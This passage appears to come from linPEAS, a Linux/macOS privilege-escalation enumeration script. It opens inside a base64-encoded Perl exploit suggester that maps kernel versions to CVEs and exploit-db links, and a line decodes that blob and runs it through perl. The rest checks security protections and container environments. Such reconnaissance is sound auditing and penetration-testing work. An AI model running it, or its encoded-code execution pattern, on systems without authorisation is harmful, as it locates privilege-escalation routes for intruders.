2LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsICcyLjYuMzQnLCAnMi42LjM1JywKICAgICAgICAgICAgJzIuNi4zNicsCiAgICAgICAgXSwKICAgICAgICBhbHQgPT4gJ2Vjb25ldCcsCiAgICAgICAgY3ZlID0+ICcyMDEwLTM4NDgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNzc4NycsCiAgICB9LAogICAgJ2hhbGZfbmVsc29uMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjAnLCAgJzIuNi4xJywgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsCiAgICAgICAgICAgICcyLjYuNicsICAnMi42LjcnLCAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsCiAgICAgICAgICAgICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsCiAgICAgICAgICAgICcyLjYuMzYnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdlY29uZXQnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0zODUwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTc3ODcnLAogICAgfSwKICAgICdoYWxmX25lbHNvbjMnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4wJywgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLAogICAgICAgICAgICAnMi42LjYnLCAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLAogICAgICAgICAgICAnMi42LjEyJywgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLAogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGFsdCA9PiAnZWNvbmV0JywKICAgICAgICBjdmUgPT4gJzIwMTAtNDA3MycsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE3Nzg3JywKICAgIH0sCiAgICAnY2Fwc190b19yb290JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicgXSwKICAgICAgICBjdmUgID0+ICduL2EnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTkxNicsCiAgICB9LAogICAgJ2FtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4wJywgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLAogICAgICAgICAgICAnMi42LjYnLCAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLAogICAgICAgICAgICAnMi42LjEyJywgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLAogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxMC00MzQ3JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ1NDA4JywKICAgIH0sCiAgICAncGt0Y2R2ZCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjAnLCAgJzIuNi4xJywgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsCiAgICAgICAgICAgICcyLjYuNicsICAnMi42LjcnLCAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsCiAgICAgICAgICAgICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsCiAgICAgICAgICAgICcyLjYuMzYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDEwLTM0MzcnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTE1MCcsCiAgICB9LAogICAgJ3ZpZGVvNGxpbnV4JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMCcsICAnMi42LjEnLCAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywKICAgICAgICAgICAgJzIuNi42JywgICcyLjYuNycsICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywKICAgICAgICAgICAgJzIuNi4xMicsICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywKICAgICAgICAgICAgJzIuNi4xOCcsICcyLjYuMTknLCAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywKICAgICAgICAgICAgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTAtMzA4MScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE1MDI0JywKICAgIH0sCiAgICAnbWVtb2RpcHBlcicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjM5JywgJzMuMC4wJywgJzMuMC4xJywgJzMuMC4yJywgJzMuMC4zJywgJzMuMC40JywKICAgICAgICAgICAgJzMuMC41JywgICczLjAuNicsICczLjEuMCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTItMDA1NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzE4NDExJywKICAgIH0sCiAgICAnc2VtdGV4JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMzcnLCAnMi42LjM4JywgJzIuNi4zOScsICczLjAuMCcsICczLjAuMScsICczLjAuMicsCiAgICAgICAgICAgICczLjAuMycsICAnMy4wLjQnLCAgJzMuMC41JywgICczLjAuNicsICczLjEuMCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTMtMjA5NCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzI1NDQ0JywKICAgIH0sCiAgICAncGVyZl9zd2V2ZW50JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICczLjAuMCcsICczLjAuMScsICczLjAuMicsICczLjAuMycsICczLjAuNCcsICczLjAuNScsCiAgICAgICAgICAgICczLjAuNicsICczLjEuMCcsICczLjIuMCcsICczLjMuMCcsICczLjQuMCcsICczLjQuMScsCiAgICAgICAgICAgICczLjQuMicsICczLjQuMycsICczLjQuNCcsICczLjQuNScsICczLjQuNicsICczLjQuOCcsCiAgICAgICAgICAgICczLjQuOScsICczLjUuMCcsICczLjYuMCcsICczLjcuMCcsICczLjguMCcsICczLjguMScsCiAgICAgICAgICAgICczLjguMicsICczLjguMycsICczLjguNCcsICczLjguNScsICczLjguNicsICczLjguNycsCiAgICAgICAgICAgICczLjguOCcsICczLjguOScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTMtMjA5NCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzI2MTMxJywKICAgIH0sCiAgICAnbXNyJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI3JywgJzIuNi4yOCcsCiAgICAgICAgICAgICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsCiAgICAgICAgICAgICcyLjYuMzUnLCAnMi42LjM2JywgJzIuNi4zNycsICcyLjYuMzgnLCAnMi42LjM5JywgJzMuMC4wJywKICAgICAgICAgICAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywgICczLjAuNScsICAnMy4wLjYnLAogICAgICAgICAgICAnMy4xLjAnLCAgJzMuMi4wJywgICczLjMuMCcsICAnMy40LjAnLCAgJzMuNS4wJywgICczLjYuMCcsCiAgICAgICAgICAgICczLjcuMCcsICAnMy43LjYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDEzLTAyNjgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yNzI5NycsCiAgICB9LAogICAgJ3RpbWVvdXRwd24nID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzMuNC4wJywgICczLjUuMCcsICAnMy42LjAnLCAgJzMuNy4wJywgICczLjguMCcsICAnMy44LjknLCAKICAgICAgICAgICAgJzMuOS4wJywgICczLjEwLjAnLCAnMy4xMS4wJywgJzMuMTIuMCcsICczLjEzLjAnLCAnMy40LjAnLAogICAgICAgICAgICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy44LjAnLCAgJzMuOC41JywgICczLjguNicsICAKICAgICAgICAgICAgJzMuOC45JywgICczLjkuMCcsICAnMy45LjYnLCAgJzMuMTAuMCcsICczLjEwLjYnLCAnMy4xMS4wJywKICAgICAgICAgICAgJzMuMTIuMCcsICczLjEzLjAnLCAnMy4xMy4xJwogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDE0LTAwMzgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8zMTM0NicsCiAgICB9LAogICAgJ3Jhd21vZGVQVFknID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLCAnMi42LjM2JywKICAgICAgICAgICAgJzIuNi4zNycsICcyLjYuMzgnLCAnMi42LjM5JywgJzMuMTQuMCcsICczLjE1LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTQtMDE5NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vcGFja2V0c3Rvcm1zZWN1cml0eS5jb20vZmlsZXMvZG93bmxvYWQvMTI2NjAzL2N2ZS0yMDE0LTAxOTYtbWQuYycsCiAgICB9LAogICAgJ292ZXJsYXlmcycgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMy4xMy4wJywgJzMuMTYuMCcsICczLjE5LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTUtODY2MCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzM5MjMwJywKICAgIH0sCiAgICAncHBfa2V5JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCgkJCSczLjQuMCcsICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy44LjAnLCAgJzMuOC4xJywgIAogICAgICAgICAgICAnMy44LjInLCAgJzMuOC4zJywgICczLjguNCcsICAnMy44LjUnLCAgJzMuOC42JywgICczLjguNycsICAKICAgICAgICAgICAgJzMuOC44JywgICczLjguOScsICAnMy45LjAnLCAgJzMuOS42JywgICczLjEwLjAnLCAnMy4xMC42JywgCiAgICAgICAgICAgICczLjExLjAnLCAnMy4xMi4wJywgJzMuMTMuMCcsICczLjEzLjEnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTYtMDcyOCcsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzM5Mjc3JywKICAgIH0sCiAgICAnZGlydHlfY293JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsIAoJCQknMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAKICAgICAgICAgICAgJzIuNi4zMycsICcyLjYuMzQnLCAnMi42LjM1JywgJzIuNi4zNicsICcyLjYuMzcnLCAnMi42LjM4JywgCiAgICAgICAgICAgICcyLjYuMzknLCAnMy4wLjAnLCAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywgIAogICAgICAgICAgICAnMy4wLjUnLCAgJzMuMC42JywgICczLjEuMCcsICAnMy4yLjAnLCAgJzMuMy4wJywgICczLjQuMCcsICAKICAgICAgICAgICAgJzMuNS4wJywgICczLjYuMCcsICAnMy43LjAnLCAgJzMuNy42JywgICczLjguMCcsICAnMy45LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTYtNTE5NScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzQwNjE2JywKICAgIH0sCiAgICAnYWZfcGFja2V0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzQuNC4wJyBdLAogICAgICAgIGN2ZSA9PiAnMjAxNi04NjU1JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NzEnLAogICAgfSwKICAgICdwYWNrZXRfc2V0X3JpbmcnID0+IHsKICAgICAgICB2dWxuID0+IFsnNC44LjAnIF0sCiAgICAgICAgY3ZlID0+ICcyMDE3LTczMDgnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80MTk5NCcsCiAgICB9LAogICAgJ2Nsb25lX25ld3VzZXInID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzMuMy41JywgJzMuMy40JywgJzMuMy4yJywgJzMuMi4xMycsICczLjIuOScsICczLjIuMScsIAogICAgICAgICAgICAnMy4xLjgnLCAnMy4wLjUnLCAnMy4wLjQnLCAnMy4wLjInLCAnMy4wLjEnLCAnMy4yJywgJzMuMC4xJywgJzMuMCcKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnTlxBJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzgzOTAnLAogICAgfSwKICAgICdnZXRfcmVrdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnNC40LjAnLCAnNC44LjAnLCAnNC4xMC4wJywgJzQuMTMuMCcKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxNy0xNjY5NScsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzQ1MDEwJywKICAgIH0sCiAgICAnZXhwbG9pdF94JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsCiAgICAgICAgICAgICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsICcyLjYuMzAnLCAnMi42LjMxJywgJzIuNi4zMicsCiAgICAgICAgICAgICcyLjYuMzMnLCAnMi42LjM0JywgJzIuNi4zNScsICcyLjYuMzYnLCAnMi42LjM3JywgJzIuNi4zOCcsCiAgICAgICAgICAgICcyLjYuMzknLCAnMy4wLjAnLCAgJzMuMC4xJywgICczLjAuMicsICAnMy4wLjMnLCAgJzMuMC40JywKICAgICAgICAgICAgJzMuMC41JywgICczLjAuNicsICAnMy4xLjAnLCAgJzMuMi4wJywgICczLjMuMCcsICAnMy40LjAnLAogICAgICAgICAgICAnMy41LjAnLCAgJzMuNi4wJywgICczLjcuMCcsICAnMy43LjYnLCAgJzMuOC4wJywgICczLjkuMCcsCiAgICAgICAgICAgICczLjEwLjAnLCAnMy4xMS4wJywgJzMuMTIuMCcsICczLjEzLjAnLCAnMy4xNC4wJywgJzMuMTUuMCcsCiAgICAgICAgICAgICczLjE2LjAnLCAnMy4xNy4wJywgJzMuMTguMCcsICczLjE5LjAnLCAnNC4wLjAnLCAgJzQuMS4wJywKICAgICAgICAgICAgJzQuMi4wJywgICc0LjMuMCcsICAnNC40LjAnLCAgJzQuNS4wJywgICc0LjYuMCcsICAnNC43LjAnCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTgtMTQ2NjUnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80NTY5NycsCiAgICB9LAogICk7Cn0KCl9fRU5EX18KPWhlYWQxIE5BTUUKCmxpbnV4X2V4cGxvaXRfc3VnZ2VzdGVyLTIucGwgLSBBIGxvY2FsIGV4cGxvaXQgc3VnZ2VzdGVyIGZvciBsaW51eAoKPWhlYWQxIERFU0NSSVBUSU9OCgpUaGlzIHBlcmwgc2NyaXB0IHdpbGwgZW51bWVyYXRlIHRoZSBwb3NzaWJsZSBleHBsb2l0cyBhdmFpbGFibGUgZm9yIGEgZ2l2ZW4ga2VybmVsIHZlcnNpb24KCj1oZWFkMSBVU0FHRQoKWy1oXSBIZWxwICh0aGlzIG1lc3NhZ2UpClsta10gS2VybmVsIG51bWJlciAoZWcuIDIuNi4yOCkKWy1kXSBPcGVuIGV4cGxvaXQgZG93bmxvYWQgbWVudQoKWW91IGNhbiBhbHNvIHByb3ZpZGUgYSBwYXJ0aWFsIGtlcm5lbCB2ZXJzaW9uIChlZy4gMi40KQp0byBzZWUgYWxsIGV4cGxvaXRzIGF2YWlsYWJsZS4KCj1oZWFkMSBBVVRIT1IKCkpvbmF0aGFuIERvbmFzIChjKSAyMDE5Cgo9Y3V0Cgo9aGVhZDEgTElDRU5TRQoKIExpbnV4IEV4cGxvaXQgU3VnZ2VzdGVyIDIKCiBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb247IGVpdGhlciB2ZXJzaW9uIDIgb2YgdGhlIExpY2Vuc2UsIG9yCiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUKIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiAgICAgICAgCiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZwogd2l0aCB0aGlzIHByb2dyYW07IGlmIG5vdCwgd3JpdGUgdG8gdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgSW5jLiwKIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCgo9Y3V0Cg=="
    echo $les2_b64 | base64 -d | perl 2>/dev/null | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "CVE" -B 1 -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,CVE-[0-9]+-[0-9]+,${SED_RED},g"
    echo ""
fi

if [ "$MACPEAS" ] && [ "$(command -v brew 2>/dev/null)" ]; then
    print_2title "Brew Doctor Suggestions"
    brew doctor
    echo ""
fi



#-- SY) AppArmor
print_2title "Protections"
print_list "AppArmor enabled? .............. "$NC
if [ "$(command -v aa-status 2>/dev/null)" ]; then
    aa-status 2>&1 | sed "s,disabled,${SED_RED},"
elif [ "$(command -v apparmor_status 2>/dev/null)" ]; then
    apparmor_status 2>&1 | sed "s,disabled,${SED_RED},"
elif [ "$(ls -d /etc/apparmor* 2>/dev/null)" ]; then
    ls -d /etc/apparmor*
else
    echo_not_found "AppArmor"
fi

#-- SY) AppArmor2
print_list "AppArmor profile? .............. "$NC
(cat /proc/self/attr/current 2>/dev/null || echo "unconfined") | sed "s,unconfined,${SED_RED}," | sed "s,kernel,${SED_GREEN},"

#-- SY) LinuxONE
print_list "is linuxONE? ................... "$NC
( (uname -a | grep "s390x" >/dev/null 2>&1) && echo "Yes" || echo_not_found "s390x")

#-- SY) grsecurity
print_list "grsecurity present? ............ "$NC
( (uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo_not_found "grsecurity")

#-- SY) PaX
print_list "PaX bins present? .............. "$NC
(command -v paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo_not_found "PaX")

#-- SY) Execshield
print_list "Execshield enabled? ............ "$NC
(grep "exec-shield" /etc/sysctl.conf 2>/dev/null || echo_not_found "Execshield") | sed "s,=0,${SED_RED},"

#-- SY) SElinux
print_list "SELinux enabled? ............... "$NC
(sestatus 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"

#-- SY) Seccomp
print_list "Seccomp enabled? ............... "$NC
([ "$(grep Seccomp /proc/self/status 2>/dev/null | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"

#-- SY) AppArmor
print_list "User namespace? ................ "$NC
if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then echo "enabled" | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi

#-- SY) cgroup2
print_list "Cgroup2 enabled? ............... "$NC
([ "$(grep cgroup2 /proc/filesystems 2>/dev/null)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"

#-- SY) Gatekeeper
if [ "$MACPEAS" ]; then
    print_list "Gatekeeper enabled? .......... "$NC
    (spctl --status 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"

    print_list "sleepimage encrypted? ........ "$NC
    (sysctl vm.swapusage | grep "encrypted" | sed "s,encrypted,${SED_GREEN},") || echo_no

    print_list "XProtect? .................... "$NC
    (system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5 | grep -Iv "^$") || echo_no

    print_list "SIP enabled? ................. "$NC
    csrutil status | sed "s,enabled,${SED_GREEN}," | sed "s,disabled,${SED_RED}," || echo_no

    print_list "Connected to JAMF? ........... "$NC
    warn_exec jamf checkJSSConnection

    print_list "Connected to AD? ............. "$NC
    dsconfigad -show && echo "" || echo_no
fi

#-- SY) ASLR
print_list "Is ASLR enabled? ............... "$NC
ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
if [ -z "$ASLR" ]; then
    echo_not_found "/proc/sys/kernel/randomize_va_space";
else
    if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
    echo ""
fi

#-- SY) Printer
print_list "Printer? ....................... "$NC
(lpstat -a || system_profiler SPPrintersDataType || echo_no) 2>/dev/null

#-- SY) Running in a virtual environment
print_list "Is this a virtual machine? ..... "$NC
hypervisorflag=$(grep flags /proc/cpuinfo 2>/dev/null | grep hypervisor)
if [ "$(command -v systemd-detect-virt 2>/dev/null)" ]; then
    detectedvirt=$(systemd-detect-virt)
    if [ "$hypervisorflag" ]; then printf $RED"Yes ($detectedvirt)"$NC; else printf $GREEN"No"$NC; fi
else
    if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q container; then
print_title "Container"
###########################################
#---------) Container functions (---------#
###########################################

containerCheck() {
  inContainer=""
  containerType="$(echo_no)"

  # Are we inside docker?
  if [ -f "/.dockerenv" ] ||
    grep "/docker/" /proc/1/cgroup -qa 2>/dev/null ||
    grep -qai docker /proc/self/cgroup  2>/dev/null ||
    [ "$(find / -maxdepth 3 -name '*dockerenv*' -exec ls -la {} \; 2>/dev/null)" ] ; then

    inContainer="1"
    containerType="docker\n"
  fi

  # Are we inside kubernetes?
  if grep "/kubepod" /proc/1/cgroup -qa 2>/dev/null ||
    grep -qai kubepods /proc/self/cgroup 2>/dev/null; then

    inContainer="1"
    if [ "$containerType" ]; then containerType="$containerType (kubernetes)\n"
    else containerType="kubernetes\n"
    fi
  fi
  
  # Inside concourse?
  if grep "/concourse" /proc/1/mounts -qa 2>/dev/null; then
    inContainer="1"
    if [ "$containerType" ]; then 
      containerType="$containerType (concourse)\n"
    fi
  fi

  # Are we inside LXC?
  if env | grep "container=lxc" -qa 2>/dev/null ||
      grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then

    inContainer="1"
    containerType="lxc\n"
  fi

  # Are we inside podman?
  if env | grep -qa "container=podman" 2>/dev/null ||
      grep -qa "container=podman" /proc/1/environ 2>/dev/null; then

    inContainer="1"
    containerType="podman\n"
  fi

  # Check for other container platforms that report themselves in PID 1 env
  if [ -z "$inContainer" ]; then
    if grep -a 'container=' /proc/1/environ 2>/dev/null; then
      inContainer="1"
      containerType="$(grep -a 'container=' /proc/1/environ | cut -d= -f2)\n"
    fi
  fi
}

inDockerGroup() {
  DOCKER_GROUP="No"
  if groups 2>/dev/null | grep -q '\bdocker\b'; then
    DOCKER_GROUP="Yes"
  fi
}

checkDockerRootless() {
  DOCKER_ROOTLESS="No"
  if docker info 2>/dev/null|grep -q rootless; then
    DOCKER_ROOTLESS="Yes ($TIP_DOCKER_ROOTLESS)"
  fi
}

enumerateDockerSockets() {
  dockerVersion="$(echo_not_found)"
  if ! [ "$SEARCHED_DOCKER_SOCKETS" ]; then
    SEARCHED_DOCKER_SOCKETS="1"
